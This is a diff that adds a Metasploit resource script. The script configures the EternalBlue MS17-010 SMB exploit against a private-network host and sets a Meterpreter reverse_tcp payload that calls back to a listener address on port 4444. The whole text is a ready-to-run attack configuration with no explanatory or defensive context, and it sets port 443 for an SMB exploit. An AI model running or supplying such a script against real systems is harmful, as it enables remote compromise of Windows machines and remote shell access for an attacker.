@@ -1,0 +1,13 @@
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST 192.168.1.1
+set RPORT 443
+set SMBDomain .
+set SMBPass 
+set SMBUser 
+set VERIFY_ARCH true
+set VERIFY_TARGET true
+set payload windows/meterpreter/reverse_tcp
+set LHOST 172.16.192.128
+set LPORT 4444
+set EXITFUNC process
+exploit
